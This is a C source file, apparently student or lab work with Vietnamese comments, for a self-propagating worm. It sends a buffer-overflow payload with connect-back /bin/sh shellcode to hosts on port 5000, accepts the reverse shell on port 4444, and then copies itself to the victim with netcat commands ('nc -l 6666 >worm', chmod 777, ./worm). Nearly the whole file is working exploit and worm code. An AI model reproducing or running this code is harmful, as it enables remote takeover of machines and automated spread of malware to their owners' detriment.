#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#define BUF_SIZE 1064

char *targetIP;
int server;
struct sockaddr_in srv;
char buffer[1024];
int flag = 0;

//standard offset (probably must be modified)
#define RET 0xbffff28b // buffer'address + 7 bytes of "Hello :"

char shellcode[140] =
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\xB8\x1B\x40\x11\x17\x35\x11\x11\x11\x11\x50\x31\xC0\x66\x68\x11"
        "\x5c\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
        "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
        "\x01\xcd\x80";

char shellcode2[140] =
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\xB8\x1B\x40\x11\x16\x35\x11\x11\x11\x11\x50\x31\xC0\x66\x68\x11"
        "\x5c\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
        "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
        "\x01\xcd\x80";


int sendPayload(char *targetIP, int targetPort){
    char buf[BUF_SIZE];
    int s, i, size;
    struct sockaddr_in remote;
    struct hostent *host;

    /*Create payload*/
    // filling buf with NOPs
    memset(buf, 0x90, BUF_SIZE);

    //targetIp = 10.81.0.7
    if (flag == 2)
    {
        //copying shellcode into buf
        memcpy(buf+900-sizeof(shellcode) , shellcode, sizeof(shellcode)-1);
    }
    //targetIp = 10.81.0.8
    else
    {
        //copying shellcode into buf
        memcpy(buf+900-sizeof(shellcode2) , shellcode2, sizeof(shellcode2)-1);
    }
    
    // Copying the return address multiple times at the end of the buf...
    for(i=901; i < BUF_SIZE-4; i+=4) { 
        * ((int *) &buf[i]) = RET;
    }
    buf[BUF_SIZE-1] = 0x0;

    //getting hostname
    host=gethostbyname(targetIP);

    // creating socket...
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
    {       
        fprintf(stderr, "Error: Socket\n");
        return 0;
    }
    //state Protocolfamily , then converting the hostname or IP address, and getting  port number
    remote.sin_family = AF_INET;
    remote.sin_addr = *((struct in_addr *)host->h_addr);
    remote.sin_port = htons(targetPort);
    // connecting with destination host
    if (connect(s, (struct sockaddr *)&remote, sizeof(remote))==-1)
    {
        close(s);
        fprintf(stderr, "Error: connect\n");
        return 0;
    }
    //sending exploit string
    size = send(s, buf, sizeof(buf), 0);
    if (size==-1)
    {
        close(s);
        fprintf(stderr, "sending data failed\n");
        return 0;
    }
    // closing socket 
    close(s);
    return 1;
}

void *createListener(){

    printf("\nStart listening on port 4444\n");
    
    // tạo socket server là máy hiện tại
    server = socket(AF_INET, SOCK_STREAM, 0);
    if (server < 0)
    {
        fprintf(stderr, "Error: Socket\n");
        return;
    }

    //state Protocolfamily , then converting the hostname or IP address, and getting  port number
    srv.sin_family = AF_INET;
    srv.sin_addr.s_addr = INADDR_ANY;
    srv.sin_port = htons(4444);
    
    if (bind(server,(struct sockaddr*) &srv, sizeof(srv)) == -1)
    {
        perror("Error: bind");
        return;
    }
    
    if (listen(server, 3) == -1)
    {
        perror("Error: listen");
        return;
    }
}

void *propagation(){
    int bytes;
    int client, client_size;
    struct sockaddr_in cli;

    //tạo socket client bên phía nạn nhân
    client = accept(server, (struct sockaddr*)&cli, &client_size);
    if (client == -1)
    {
        perror("accept() failed");
        return;
    }

    printf("------Get connect back from victim------\n");

    memcpy(buffer, "ls\x0A",4);
    bytes = send(client, buffer, 4, 0);

    if (bytes == -1)
        return;

    bytes = recv(client, buffer, sizeof(buffer), 0);
    if (bytes == -1)
        return ;

    buffer[bytes-1] = 0;
    fprintf(stderr, "Excute command ls: \n%s\n\n", buffer);
    
    printf("------Start propagating------\n");
    sleep(5);

    //Victim listien on port 6666 and get worm
    memcpy(buffer, "nc -l 6666 >worm\x0A",18);
    bytes = send(client, buffer, 18, 0);
    //memcpy(buffer, "chmod 777 worm\x0A",16);
    //bytes = send(c, buffer, 16, 0);

    printf("worm is moving now\n");

    //send worm to the victim
    sprintf(buffer, "nc %s 6666 <worm\x0A", targetIP);
    system(buffer);	

    //execute the worm
    memcpy(buffer, "chmod 777 worm\x0A",16);
    bytes = send(client, buffer, 16, 0);
    memcpy(buffer, "./worm\x0A",8);
    bytes = send(client, buffer, 8, 0);

    close(client);
}

int main(int argc, char *argv[]) {
    pthread_t thread1, thread2;
    int threatCreate;
    int targetPort = 5000;

    // First victim 10.81.0.7 
    if (argc == 2)
    {
        flag = 2;
        targetIP = argv[1];
    }
    else 
    {
        targetIP = "10.81.0.8";
    }

    // mở port 4444 trên máy hiện tại
    threatCreate = pthread_create( &thread1, NULL, createListener, NULL);

    if (sendPayload(targetIP, targetPort))
    {
        printf("Successfully exploited\n\n");

        //tự động kết nối ngược và lan truyền worm
        threatCreate = pthread_create( &thread2, NULL, propagation, NULL);
        //tiếp tục main sau khi thực hiện xong thread2
        pthread_join( thread2, NULL);
        
        printf("---Attack completed---\n");
    }
    else 
    {
        printf("Exploited fail\n");
    }
    
}
